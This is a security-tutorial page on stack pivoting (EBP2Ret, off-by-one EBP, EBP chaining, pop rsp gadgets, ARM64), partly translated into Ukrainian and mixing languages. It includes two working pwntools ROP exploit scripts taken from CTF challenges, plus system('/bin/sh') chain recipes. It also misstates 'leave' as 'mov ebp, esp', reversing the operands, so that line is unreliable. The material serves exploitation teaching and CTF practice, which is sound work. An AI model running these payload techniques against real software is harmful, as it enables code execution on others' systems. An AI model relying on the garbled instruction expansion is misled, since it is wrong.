# Stack Pivoting - EBP2Ret - EBP chaining

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ **Base Pointer (EBP)** –¥–ª—è –∑'—î–¥–Ω–∞–Ω–Ω—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Ö —Ñ—É–Ω–∫—Ü—ñ–π —á–µ—Ä–µ–∑ –æ–±–µ—Ä–µ–∂–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ä–µ–≥—ñ—Å—Ç—Ä–∞ EBP —Ç–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ–π **`leave; ret`**.

–ù–∞–≥–∞–¥–∞—î–º–æ, —â–æ **`leave`** –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –æ–∑–Ω–∞—á–∞—î:
```
mov       ebp, esp
pop       ebp
ret
```
And as the **EBP is in the stack** before the EIP it's possible to control it controlling the stack.

### EBP2Ret

This technique is particularly useful when you can **alter the EBP register but have no direct way to change the EIP register**. It leverages the behaviour of functions when they finish executing.

If, during `fvuln`'s execution, you manage to inject a **fake EBP** in the stack that points to an area in memory where your shellcode's address is located (plus 4 bytes to account for the `pop` operation), you can indirectly control the EIP. As `fvuln` returns, the ESP is set to this crafted location, and the subsequent `pop` operation decreases ESP by 4, **effectively making it point to an address store by the attacker in there.**\
Note how you **need to know 2 addresses**: The one where ESP is going to go, where you will need to write the address that is pointed by ESP.

#### Exploit Construction

First you need to know an **address where you can write arbitrary data / addresses**. The ESP will point here and **run the first `ret`**.

Then, you need to know the address used by `ret` that will **execute arbitrary code**. You could use:

* A valid [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) address.
* The address of **`system()`** followed by **4 junk bytes** and the address of `"/bin/sh"` (x86 bits).
* The address of a **`jump esp;`** gadget ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) followed by the **shellcode** to execute.
* Some [**ROP**](../rop-return-oriented-programing/) chain

Remember than before any of these addresses in the controlled part of the memory, there must be **`4` bytes** because of the **`pop`** part of the `leave` instruction. It would be possible to abuse these 4B to set a **second fake EBP** and continue controlling the execution.

#### Off-By-One Exploit

There's a specific variant of this technique known as an "Off-By-One Exploit". It's used when you can **only modify the least significant byte of the EBP**. In such a case, the memory location storing the address to jumo to with the **`ret`** must share the first three bytes with the EBP, allowing for a similar manipulation with more constrained conditions.\
Usually it's modified the byte 0x00t o jump as far as possible.

Also, it's common to use a RET sled in the stack and put the real ROP chain at the end to make it more probably that the new ESP points inside the RET SLED and the final ROP chain is executed.

### **EBP Chaining**

Therefore, putting a controlled address in the `EBP` entry of the stack and an address to `leave; ret` in `EIP`, it's possible to **move the `ESP` to the controlled `EBP` address from the stack**.

Now, the **`ESP`** is controlled pointing to a desired address and the next instruction to execute is a `RET`. To abuse this, it's possible to place in the controlled ESP place this:

* **`&(next fake EBP)`** -> Load the new EBP because of `pop ebp` from the `leave` instruction
* **`system()`** -> Called by `ret`
* **`&(leave;ret)`** -> Called after system ends, it will move ESP to the fake EBP and start agin
* **`&("/bin/sh")`**-> Param fro `system`

Basically this way it's possible to chain several fake EBPs to control the flow of the program.

This is like a [ret2lib](../rop-return-oriented-programing/ret2lib/), but more complex with no apparent benefit but could be interesting in some edge-cases.

Moreover, here you have an [**example of a challenge**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) that uses this technique with a **stack leak** to call a winning function. This is the final payload from the page:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP –º–æ–∂–µ –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—å

–Ø–∫ [**–ø–æ—è—Å–Ω–µ–Ω–æ –≤ —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), —è–∫—â–æ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π –∑ –¥–µ—è–∫–∏–º–∏ –æ–ø—Ç–∏–º—ñ–∑–∞—Ü—ñ—è–º–∏, **EBP –Ω—ñ–∫–æ–ª–∏ –Ω–µ –∫–æ–Ω—Ç—Ä–æ–ª—é—î ESP**, –æ—Ç–∂–µ, –±—É–¥—å-—è–∫–∏–π –µ–∫—Å–ø–ª–æ–π—Ç, —â–æ –ø—Ä–∞—Ü—é—î —à–ª—è—Ö–æ–º –∫–æ–Ω—Ç—Ä–æ–ª—é EBP, –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –∑–∞–∑–Ω–∞—î –Ω–µ–≤–¥–∞—á—ñ, –æ—Å–∫—ñ–ª—å–∫–∏ –Ω–µ –º–∞—î –∂–æ–¥–Ω–æ–≥–æ —Ä–µ–∞–ª—å–Ω–æ–≥–æ –µ—Ñ–µ–∫—Ç—É.\
–¶–µ –ø–æ–≤'—è–∑–∞–Ω–æ –∑ —Ç–∏–º, —â–æ **–ø—Ä–æ–ª–æ–≥ —ñ –µ–ø—ñ–ª–æ–≥ –∑–º—ñ–Ω—é—é—Ç—å—Å—è**, —è–∫—â–æ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –æ–ø—Ç–∏–º—ñ–∑–æ–≤–∞–Ω–∏–π.

* **–ù–µ –æ–ø—Ç–∏–º—ñ–∑–æ–≤–∞–Ω–æ:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **–û–ø—Ç–∏–º—ñ–∑–æ–≤–∞–Ω–æ:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## –Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –∫–æ–Ω—Ç—Ä–æ–ª—é RSP

### **`pop rsp`** –≥–∞–¥–∂–µ—Ç

[**–ù–∞ —Ü—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –ø—Ä–∏–∫–ª–∞–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏. –î–ª—è —Ü—å–æ–≥–æ –∑–∞–≤–¥–∞–Ω–Ω—è –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–ª–æ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é –∑ 2 —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏–º–∏ –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏, —ñ –±—É–≤ **`pop rsp` –≥–∞–¥–∂–µ—Ç** —Ç–∞ —î **leak –∑ —Å—Ç–µ–∫—É**:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ç–µ—Ö–Ω—ñ–∫—É ret2esp —Ç—É—Ç:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è —Ç–∞ —ñ–Ω—à—ñ –ø—Ä–∏–∫–ª–∞–¥–∏

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
* [https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/dcquals19\_speedrun4/index.html)
* 64 –±—ñ—Ç–∏, –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è off by one –∑ –ª–∞–Ω—Ü—é–≥–æ–º rop, —â–æ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ ret sled
* [https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/insomnihack18\_onewrite/index.html)
* 64 –±—ñ—Ç–∏, –±–µ–∑ relro, canary, nx —Ç–∞ pie. –ü—Ä–æ–≥—Ä–∞–º–∞ –Ω–∞–¥–∞—î leak –¥–ª—è —Å—Ç–µ–∫—É –∞–±–æ pie —Ç–∞ WWW –¥–ª—è qword. –°–ø–æ—á–∞—Ç–∫—É –æ—Ç—Ä–∏–º–∞–π—Ç–µ leak —Å—Ç–µ–∫—É —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ WWW, —â–æ–± –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ leak pie. –ü–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ WWW, —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ –≤—ñ—á–Ω–∏–π —Ü–∏–∫–ª, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –∑–∞–ø–∏—Å–∞–º–∏ `.fini_array` + –≤–∏–∫–ª–∏–∫–æ–º `__libc_csu_fini` ([–±—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó —Ç—É—Ç](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini\_array.md)). –ó–ª–æ–≤–∂–∏–≤–∞—é—á–∏ —Ü–∏–º "–≤—ñ—á–Ω–∏–º" –∑–∞–ø–∏—Å–æ–º, –∑–∞–ø–∏—Å—É—î—Ç—å—Å—è –ª–∞–Ω—Ü—é–≥ ROP —É .bss —ñ –≤ –∫—ñ–Ω—Ü—ñ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è, –ø—ñ–¥—ñ–π–º–∞—é—á–∏—Å—å –∑ RBP.

## ARM64

–í ARM64, **–ø—Ä–æ–ª–æ–≥ —Ç–∞ –µ–ø—ñ–ª–æ–≥–∏** —Ñ—É–Ω–∫—Ü—ñ–π **–Ω–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å —ñ –Ω–µ –≤—ñ–¥–Ω–æ–≤–ª—é—é—Ç—å —Ä–µ—î—Å—Ç—Ä SP** —É —Å—Ç–µ–∫—É. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, **—ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è `RET`** –Ω–µ –ø–æ–≤–µ—Ä—Ç–∞—î –∑–∞ –∞–¥—Ä–µ—Å–æ—é, –Ω–∞ —è–∫—É –≤–∫–∞–∑—É—î SP, –∞ **–∑–∞ –∞–¥—Ä–µ—Å–æ—é –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `x30`**.

–û—Ç–∂–µ, –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, –ø—Ä–æ—Å—Ç–æ –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –µ–ø—ñ–ª–æ–≥–æ–º, –≤–∏ **–Ω–µ –∑–º–æ–∂–µ—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ —Ä–µ—î—Å—Ç—Ä SP**, –ø–µ—Ä–µ–ø–∏—Å—É—é—á–∏ –¥–µ—è–∫—ñ –¥–∞–Ω—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å—Ç–µ–∫—É. –Ü –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∞–º –≤–¥–∞—Å—Ç—å—Å—è –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ SP, –≤–∞–º –≤—Å–µ —â–µ –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è —Å–ø–æ—Å—ñ–± **–∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ —Ä–µ—î—Å—Ç—Ä `x30`**.

*   –ø—Ä–æ–ª–æ–≥

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP –≤–∫–∞–∑—É—î –Ω–∞ –∑–∞–ø–∏—Å –∫–∞–¥—Ä—É
```
*   –µ–ø—ñ–ª–æ–≥

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

{% hint style="danger" %}
–°–ø–æ—Å—ñ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ —â–æ—Å—å –ø–æ–¥—ñ–±–Ω–µ –¥–æ —Å—Ç–µ–∫–æ–≤–æ–≥–æ –ø—ñ–¥—ñ–π–º–∞–Ω–Ω—è –≤ ARM64 –ø–æ–ª—è–≥–∞—Ç–∏–º–µ –≤ —Ç–æ–º—É, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ `SP`** (–∫–æ–Ω—Ç—Ä–æ–ª—é—é—á–∏ —è–∫–∏–π—Å—å —Ä–µ—î—Å—Ç—Ä, –∑–Ω–∞—á–µ–Ω–Ω—è —è–∫–æ–≥–æ –ø–µ—Ä–µ–¥–∞—î—Ç—å—Å—è –¥–æ `SP`, –∞–±–æ —Ç–æ–º—É, —â–æ –∑ —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏ `SP` –±–µ—Ä–µ —Å–≤–æ—é –∞–¥—Ä–µ—Å—É –∑—ñ —Å—Ç–µ–∫—É, —ñ —É –Ω–∞—Å —î –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è) —ñ –ø–æ—Ç—ñ–º **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –µ–ø—ñ–ª–æ–≥–æ–º**, —â–æ–± –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ **—Ä–µ—î—Å—Ç—Ä `x30`** –∑ **–∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ–≥–æ `SP`** —ñ **`RET`** –¥–æ –Ω—å–æ–≥–æ.
{% endhint %}

–¢–∞–∫–æ–∂ –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç **Ret2esp –≤ ARM64**:

{% content-ref url="../rop-return-oriented-programing/ret2esp-ret2reg.md" %}
[ret2esp-ret2reg.md](../rop-return-oriented-programing/ret2esp-ret2reg.md)
{% endcontent-ref %}

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
